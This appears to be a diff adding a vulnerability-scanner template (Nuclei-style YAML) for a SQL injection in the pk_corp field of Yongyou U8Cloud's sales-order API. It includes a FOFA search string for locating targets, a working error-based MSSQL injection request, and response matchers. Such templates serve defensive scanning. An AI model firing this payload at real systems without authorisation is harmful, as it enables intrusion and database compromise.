@@ -1,0 +1,38 @@
+id: poc-yaml-yongyou-u8-cloud-pk-corp-sqli
+info:
+  name: Yongyou U8Cloud pk_corp SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: Yongyou U8Cloud
+    fofa: app="用友-U8-Cloud"
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /u8cloud/openapi/so.saleorder.briefing?appcode=huo&isEncrypt=N HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"pk_corp":"' AND 9173 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}')))) AND 'rhYc'='rhYc","cuserid":"","date_begin":"","date_end":"",}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "U8C返回信息"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
